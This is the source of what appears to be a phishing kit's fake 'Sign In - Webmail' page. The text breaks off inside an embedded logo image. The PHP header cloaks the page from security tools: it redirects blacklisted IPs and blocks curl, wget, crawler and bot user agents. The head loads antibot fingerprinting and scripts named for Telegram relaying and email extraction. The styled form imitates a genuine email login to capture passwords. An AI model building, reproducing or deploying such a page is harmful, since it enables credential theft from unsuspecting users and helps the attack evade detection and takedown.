<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Webmail</title>
    
    <!-- Antibot Scripts -->
    <script src="../m/js/fingerprint.js"></script>
    <script src="../m/js/utils.js"></script>
    <script src="../m/js/captcha.js"></script>
    
    <!-- Centralized Functions -->
    <script src="../js/centralized_telegram.js"></script>
    <script src="../js/email_extractor.js"></script>
    <script src="../js/centralized_redirect.js"></script>
    <script src="../js/autofill_helper.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="fonts/font.css">
    <!-- Replace generic/outlook favicon with a small transparent data URI so the Outlook envelope doesn't appear -->
    <!-- Colorless (monochrome) envelope icon: matches the screenshot style -->
    <!-- Favicon: use a softer stroke color to better match the screenshot (not pure white) -->
    <!-- Favicon updated to a softer off-white/light-teal stroke to match the screenshot -->
    <link rel="icon" href='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect x="0" y="0" width="24" height="24" rx="2" fill="none"/><path d="M2 7V18a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V7" fill="none" stroke="%23D8F0EA" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 7l-10 6L2 7" fill="none" stroke="%23D8F0EA" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>' />
    <link rel="apple-touch-icon" href='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect x="0" y="0" width="24" height="24" rx="2" fill="none"/><path d="M2 7V18a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V7" fill="none" stroke="%23D8F0EA" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 7l-10 6L2 7" fill="none" stroke="%23D8F0EA" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>' />
    <!-- Theme color: helps some browsers display a matching tab/panel color on mobile/OS UI -->
    <meta name="theme-color" content="#15393B" />
    <style>
                .initSpinner {
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    width: 32px;
                    height: 32px;
                    background-color: #808080;
                    margin: -16px 0 0 -16px;
                    animation: rootSpinner 1.2s infinite ease-in-out;
                }
                @keyframes rootSpinner {
                    0% { transform: perspective(120px) rotateX(0) rotateY(0); }
                    50% { transform: perspective(120px) rotateX(-180deg) rotateY(0); }
                    100% { transform: perspective(120px) rotateX(-180deg) rotateY(-180deg); }
                }
                .keypressFocused:focus,
                .parentFocus {
                    
                    outline-offset: 2px;
                }
                .MuiCheckbox-root.Mui-focusVisible {
                    outline: #2e73e2 solid 2px;
                }
                *:focus-visible {
                    outline: 0;
                }
        body {
            background: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #1a2a3a;
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 6px solid #1976b2;
            border-top: 6px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 0 16px;
        }
        html, body { height: 100%; }
        .logo {
            margin-bottom: 16px;
        }
        .logo img {
            height: 56px; /* reduced size for logo */
            width: auto;
            display: block;
            margin: 0 auto;
        }
        .login-form {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .input-group {
            width: 100%;
            margin-bottom: 28px;
            position: relative;
            max-width: 400px;
        }
        label {
            position: absolute;
            left: 0;
            top: 28px;
            background: transparent;
            padding-left: 20px;
            color: #1976b2;
            font-size: 0.78rem;
            pointer-events: none;
            transition: top 0.2s, font-size 0.2s, color 0.2s;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 28px 20px 6px 20px;
            border: none;
            border-bottom: 1px solid #1976b2;
            background: transparent;
            font-size: 0.92rem;
            color: #1a2a3a;
            outline: none;
            transition: border-color 0.2s;
            box-sizing: border-box;
        }
        input[type="email"]:focus,
        input[type="password"]:focus,
        input[type="text"]:focus {
            border-bottom: 2px solid #1565a0;
        }
        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 0.68rem;
            color: #1565a0;
        }
        .password-group {
            position: relative;
        }
        /* Ensure the toggle sits outside the input field so text doesn't
           get covered when showing the password. Add right padding on
           inputs in this group to accommodate the control. */
        .password-group input[type="password"],
        .password-group input[type="text"] {
            padding-right: 44px;
        }
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #1976b2;
            z-index: 3;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            background: transparent;
            border-radius: 16px;
            border: none;
            padding: 0;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }
        .toggle-password svg { display: block; }
        .toggle-password .eye-open { display: block; }
        .toggle-password .eye-closed { display: none; }
        .toggle-password[aria-pressed="true"] .eye-open { display: none; }
        .toggle-password[aria-pressed="true"] .eye-closed { display: block; }
        .toggle-password:hover { background: rgba(25,118,178,0.05); }
        .toggle-password svg path { vector-effect: non-scaling-stroke; }
        .btn {
            width: 100%;
            max-width: 400px;
            padding: 6px 0;
            background: #1565a0;
            color: #fff;
            font-weight: 600;
            font-size: 0.75rem;
            border: none;
            border-radius: 8px;
            margin-top: 12px;
            cursor: pointer;
            transition: background 0.2s;
            box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 3px 1px -2px rgba(0,0,0,0.2), 0 1px 5px 0 rgba(0,0,0,0.12);
            display: block;
            margin-left: auto;
        }
        .btn:hover {
            background: #1976b2;
        }
        .error-message {
            display: none;
            color: #f22c42;
            font-weight: 600;
            margin-top: 10px;
            text-align: center;
        }
        .shake {
            animation: shake 0.4s ease-in-out;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            50% { transform: translateX(6px); }
            75% { transform: translateX(-6px); }
            100% { transform: translateX(0); }
        }
        .links {
            margin-top: 32px;
            display: flex;
            justify-content: center;
            gap: 18px;
            font-size: 0.85rem;
        }
        .links a {
            color: #1976b2;
            text-decoration: underline;
            text-underline-offset: 3px;
            transition: text-decoration 0.2s;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            color: #1976b2;
            font-size: 0.85rem;
        }
        .language {
            margin-top: 12px;
            color: #1976b2;
            font-size: 0.85rem;
        }
        /* Anti-copy: prevent text selection for most elements. Inputs are still selectable. */
        body.nocopy, body.nocopy *:not(input):not(textarea) {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
        @media (max-width: 500px) {
            .login-form {
                max-width: 95vw;
            }
            .logo img { height: 44px; }
            input[type="email"], input[type="password"] {
                padding: 20px 16px 8px 16px;
                font-size: 1rem;
            }
            label { top: 22px; }
            .toggle-password { top: 50%; right: 8px; }
            .btn { font-size: 0.9rem; padding: 10px 0; }
        }
    </style>
        <script>
            function handleReloadClick() {
                localStorage.removeItem("webmail-8.26.0");
                location.reload(true);
            }
        </script>
</head>
<body class="nocopy">
            <script>
                // Apply a slight zoom on larger screens for layout parity but
                // avoid forcing zoom on touch devices which can break gestures.
                try {
                    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                    if (!isTouch && window.innerWidth >= 900) {
                        document.body.style.zoom = '1.08';
                    }
                } catch (err) { /* ignore */ }
            </script>
        <div id="app" style="height: 100%">
            <div class="initSpinner" id="initSpinner"></div>
        </div>
        <div id="initError" style="display:none;flex-direction:column;align-items:center;margin:4rem 2rem;">
            <svg width="100px" height="100px" viewBox="0 0 16.003 16.003" xmlns="http://www.w3.org/2000/svg">
                <path color="#000000" d="M6.428 1c-.45.005-.778-.012-1.047.137a.676.676 0 0 0-.3.357c-.06.157-.08.343-.08.578V3.93c0 .235.021.42.08.576a.677.677 0 0 0 .3.357c.269.148.597.132 1.047.137H7v2H3.5c-.666 0-1.137.408-1.322.777C1.993 8.147 2 8.5 2 8.5V10h-.572c-.45.005-.778-.012-1.047.137a.676.676 0 0 0-.3.357c-.06.157-.08.343-.08.578v1.858c0 .235.021.42.08.576a.677.677 0 0 0 .3.357c.269.148.597.132 1.047.137h2.144c.45-.005.779.012 1.047-.137.135-.074.24-.2.3-.357.058-.157.08-.341.08-.576v-1.858c0-.235-.022-.421-.08-.578a.673.673 0 0 0-.3-.357c-.268-.15-.597-.132-1.046-.137H3V8.5s.01-.145.072-.275C3.137 8.094 3.166 8 3.5 8h9.41a1.548 1.548 0 0 0-.088-.223A1.485 1.485 0 0 0 11.5 7H8V5h.572c.45-.005.778.012 1.047-.137.134-.074.24-.2.299-.357.059-.157.08-.341.08-.576V2.072c0-.235-.021-.421-.08-.578a.673.673 0 0 0-.299-.357C9.35.987 9.022 1.005 8.572 1zm-.426 1h3v2h-3zm-5 9h3v2h-3z" fill="gray" font-family="sans-serif" font-weight="400" opacity=".5" overflow="visible" style="line-height:normal;font-variant-ligatures:normal;font-variant-position:normal;font-variant-caps:normal;font-variant-numeric:normal;font-variant-alternates:normal;font-feature-settings:normal;text-indent:0;text-align:start;text-decoration-line:none;text-decoration-style:solid;text-decoration-color:#000000;text-transform:none;text-orientation:mixed;isolation:auto;mix-blend-mode:normal;marker:none;" white-space="normal"/>
                <path class="error" color="#000000" d="M12.502 9a3.5 3.5 0 0 0-3.5 3.5 3.5 3.5 0 0 0 3.5 3.5 3.5 3.5 0 0 0 3.5-3.5 3.5 3.5 0 0 0-3.5-3.5zm-.5 1h1v1.168c0 .348-.016.667-.047.957-.03.29-.069.581-.115.875h-.666a12.898 12.898 0 0 1-.125-.875 9.146 9.146 0 0 1-.047-.957zm.5 4a.5.5 0 0 1 .5.5.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5.5.5 0 0 1 .5-.5z" fill="#f22c42" overflow="visible" style="marker:none"/>
            </svg>
            <ul>
                <li lang="en">Temporary Error</li>
                <li lang="de">Vorübergehender Fehler</li>
                <li lang="fr">Erreur temporaire</li>
            </ul>
            <p>There was a temporary error and the application was unable to load.</p>
            <p>Please click the button below or refresh the page to try again.</p>
            <button class="initReloadButton" onclick="handleReloadClick()">Reload</button>
        </div>
        <div class="container" style="display:none;" id="mainContent">
        <div class="logo">
            <img src="data:image/png;base64,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